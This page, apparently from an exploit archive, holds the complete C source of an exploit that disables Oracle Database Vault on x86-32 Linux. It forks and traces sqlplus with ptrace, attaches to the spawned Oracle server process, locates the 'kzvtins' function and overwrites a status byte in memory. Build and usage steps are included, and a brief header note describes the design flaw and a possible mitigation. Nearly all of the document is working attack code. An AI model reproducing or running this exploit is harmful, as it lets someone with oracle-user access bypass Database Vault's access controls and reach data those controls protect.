<html><head><title>Oracle Database Vault  ptrace(2) Privilege Escalation Exploit</title></head><pre>/*
 * original release: http://vnull.pcnet.com.pl/blog/?p=92
 * 
 * ora_dv_mem_off.c version 0x1
 * ORACLE Database Vault runtime disabler (x86_32 Linux only)
 * AKA give_back_the_freedom
 * by Jakub 'vnull' Wartak &lt;jakub.wartak@gmail.com&gt; 26.02.2008
 * 0-day PRIVATE! D0 N0T DI$TRIBUT3!
 *
 * Tested on 10.2.0.3, CentOS 5. 
 * For other architectures/OS combos consider having fun with gdb ;]
 *
 * Whole Database Vault architecture is flawed if DBA has access to
 * oracle user process space. IMHO you could limit risk by creating
 * UNIX accounts for DBAs with membership of OSDBA group (along with 
 * oracle SUID binary and shared memory with only read permission 
 * for OSDBA group [check SHM privs: ipcs -cm] ). But how those DBAs 
 * would cope with some serious crashes (requiring for e.g. restoring 
 * controlfile) ?
 *
 * Usage: 
 *		Set enviorniment variables: ORACLE_BASE, ORACLE_SID, ORACLE_HOME
 * 		$ gcc -Wall ora_dv_mem_off.c -o ora_dv_mem_off -lbfd -liberty
 *		$ ./ora_dv_mem_off
 *
 * REQUIEREMENTS:
 *	+ run as oracle process owner (by default &quot;oracle&quot;)
 *	+ working ptrace(), it won't work in systems with ptrace() 
 *    disabled (grsecurity and some LKMs).
 *	+ BFD headers and library (binutils-devel)
 *
 * THE DOCUMENT IS PROVIDED &quot;AS IS&quot; WITHOUT WARRANTY OF ANY KIND. THE
 * CONTENT MAY CHANGE WITHOUT NOTICE. IN NO EVENT SHALL THE AUTHORS BE
 * LIABLE FOR ANY SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES, INJURIES,
 * LOSSES OR UNLAWFUL OFFENCES.
 *
 * USE AT OWN RISK!
 *
 */
#include &lt;bfd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;linux/user.h&gt;
#include &lt;linux/ptrace.h&gt;
#include &lt;asm/unistd.h&gt; /* for __NR_clone */

/* you may need to alter this */
#define ORABASE  &quot;/u01/app/oracle/product/10.2.0/bin&quot;

/* 
 * Magic... (at&amp;t syntax)
 * push %ebp
 * mov %esp, %ebp
 * mov &lt;DV_FLAG&gt;, %eax
 * [..] 
 * where DV_FLAG is 32-bit long
 */
#define ASM_DV_FUNC_PROLOG &quot;\x55\x8b\xec\xb8&quot;

const char *sqlplus = ORABASE &quot;/sqlplus&quot;;
const char *oracle =  ORABASE &quot;/oracle&quot;;
const int long_size = sizeof(long);
pid_t child;

long locate_dv_func(void) 
{
	asymbol **symbol_table;
	bfd *b = bfd_openr(oracle, NULL);
	if (b == NULL) {
		perror(&quot;bfd_openr&quot;);
		exit(-1);
	}

	bfd_check_format(b, bfd_object);
	long storage_needed = bfd_get_symtab_upper_bound(b);
	if(storage_needed &lt; 0) {
		fprintf(stderr, &quot;wtf?!\n&quot;);
		exit(-1);
	}

	if((symbol_table = (asymbol**)malloc(storage_needed)) == 0) {
		perror(&quot;malloc&quot;);
		exit(-1);
	}

	int num_symbols;
	if((num_symbols = bfd_canonicalize_symtab(b, symbol_table)) &lt;= 0) {
		fprintf(stderr, &quot;no symbols info\n&quot;);
		exit(-1);
	}

	int i;
	for(i = 0; i &lt; num_symbols; i++) {
		char *symname = bfd_asymbol_name(symbol_table[i]);
		void *symaddr = bfd_asymbol_value(symbol_table[i]);
		/* don't even ask why this funciton, for real hardcore: gdb -p &lt;oraclePIDs&gt; */
		if(!strcmp(symname, &quot;kzvtins&quot;)) {
			fprintf(stderr, &quot;[%d] symbol \&quot;kzvtins\&quot; at 0x%lx\n&quot;, getpid(), 
				(long) symaddr);
			return (long) symaddr;
		}
	}

	return 0;
}

/* from &quot;Playing with ptrace(), part#2, Linux Journal, author: Pradeep Padala */
void getdata(pid_t child, long addr, char *str, int len)
{ 
	char *laddr;
	int i, j;
	union u {
		long val;
		char chars[long_size];
	} data;
	i = 0;
	j = len / long_size;
	laddr = str;
	while(i &lt; j) {
		data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
		memcpy(laddr, data.chars, long_size);
		++i;
		laddr += long_size;
	}
	j = len % long_size;
	if(j != 0) {
		data.val = ptrace(PTRACE_PEEKDATA,child, addr + i * 4,NULL);
		memcpy(laddr, data.chars, j);
	}
	str[len] = '\0';
}

void putdata(pid_t child, long addr, char *str, int len)
{   
	char *laddr;
    int i, j;
    union u {
            long val;
            char chars[long_size];
    } data;
    i = 0;
    j = len / long_size;
    laddr = str;
    while(i &lt; j) {
        memcpy(data.chars, laddr, long_size);
        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
        ++i;
        laddr += long_size;
    }
    j = len % long_size;
    if(j != 0) {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
    }
}

void cleanup(void) 
{
	int s;
	kill(child, SIGKILL);
	wait(&amp;s);
}

int main(int ac, char **av) 
{
	int status;
	pid_t orapid = 0;

	bfd_init();
	
	if((child = fork()) == -1) {
		perror(&quot;fork&quot;);
		exit(-1);
	}

	if(child == 0) {
		if(ptrace(PTRACE_TRACEME, 0, NULL, NULL)==-1) {
			perror(&quot;unable to ptrace(PTRACE_TRACEME)&quot;);
			exit(-1);
		}

		/* launch sqlplus */
		if(execl(sqlplus, &quot;sqlplus&quot;, &quot;/nolog&quot;, NULL)==-1) {
			perror(&quot;execl&quot;);
			exit(-1);
		}

		/* not reached */
		exit(0);
	} 

	if(atexit(cleanup) != 0) {
		fprintf(stderr, &quot;[%d] unable to register cleanup function\n&quot;, getpid());
	}

	wait(&amp;status);
	if(WIFSTOPPED(status)) {
		fprintf(stderr, &quot;[%d] starting to trace sqlplus process (%d)\n&quot;, getpid(), child);
	}

	fprintf(stderr, &quot;[***] NOW TYPE IN SQLPLUS: conn / as sysdba\n&quot;);

	while(!orapid) {
		struct user_regs_struct uregs;

		ptrace(PTRACE_SYSCALL, child, 0, 0);
		wait(&amp;status);
		ptrace(PTRACE_GETREGS, child, 0, &amp;uregs);

		/* ouch! no fork()? clone()! */
		if(uregs.orig_eax==__NR_clone) {
			long *regs = 0;

			/* fprintf(stderr, &quot;[%d] clone() syscall\n&quot;, getpid()); */
			ptrace(PTRACE_SYSCALL, child, 0, 0);
			wait(&amp;status);
			if((orapid = ptrace(PTRACE_PEEKUSER, child, &amp;regs[EAX], 0)) == -1) {
				perror(&quot;ptrace(PTRACE_PEEKUSER): unable to get clone() retvalue\n&quot;);
				exit(-1);
			}
			fprintf(stderr, &quot;[%d] clone() syscall in %d, tracing orapid=%d\n&quot;, getpid(), 
				child, orapid);

			/* attach to orapid, detach from sqlplus */
			if(ptrace(PTRACE_ATTACH, orapid, 0, 0) == -1) {
				perror(&quot;ptrace(PTRACE_ATTACH) to orapid&quot;);
				exit(-1);
			}

			while(1) {
				ptrace(PTRACE_SYSCALL, orapid, 0, 0);
				wait(&amp;status);
				ptrace(PTRACE_GETREGS, orapid, 0, &amp;uregs);
				if(uregs.orig_eax==__NR_execve) {
					fprintf(stderr, &quot;[%d] execve() syscall in %d, \n&quot;, getpid(), orapid);
					/* end ptrace of syscall */		
					ptrace(PTRACE_SYSCALL, orapid, 0, 0);
					break;
				} else {
					//fprintf(stderr, &quot;got %ld\n&quot;, uregs.orig_eax);
					ptrace(PTRACE_SYSCALL, orapid, 0, 0);
				}
			}

			if(ptrace(PTRACE_DETACH, child, 0, 0) == -1) {
				perror(&quot;ptrace(PTRACE_DETACH) from child&quot;);
				exit(-1);
			}

		} else if(uregs.orig_eax==__NR_execve) {
			fprintf(stderr, &quot;[%d] execve() syscall in %d\n&quot;, getpid(), child);
		}
	}

	/* now we have oracle server process under our control :) */
	long dv_func = locate_dv_func();
	if(dv_func == 0) {
		fprintf(stderr, &quot;ERROR: unable to find function\n&quot;);
		exit(-1);
	}
	wait(&amp;status);

	unsigned char buf[32];
	memset(buf, 0, sizeof(buf));
	getdata(orapid, dv_func, (char *)&amp;buf, 32);

	/* dump opcodes */
	/*
    for(i = 0; i &lt; 31; i++) {
		fprintf(stderr, &quot;%x &quot;, (unsigned char)buf[i]);
	} */
	
	if(!memcmp(buf, ASM_DV_FUNC_PROLOG, strlen(ASM_DV_FUNC_PROLOG))) {
		unsigned char dv_status;
		unsigned long woff = dv_func + strlen(ASM_DV_FUNC_PROLOG), woff2=woff;

		getdata(orapid, woff, (char *)&amp;dv_status, 1);
		fprintf(stderr, &quot;[***] sucessfuly validated function, DatabaseVault=%d\n&quot;, dv_status);
		fprintf(stderr, &quot;[***] attempting to rewrite memory at 0x%lx\n&quot;, woff2);
	
		unsigned char my = 0;
		putdata(orapid, woff2, (void *)&amp;my, 1);
	}

	if(ptrace(PTRACE_DETACH, orapid, 0, 0) == -1) {
		perror(&quot;ptrace(PTRACE_DETACH) from orapid&quot;);
		exit(-1);
	}

	wait(&amp;status);
	exit(0);
}

// milw0rm.com [2008-11-20]</pre></html>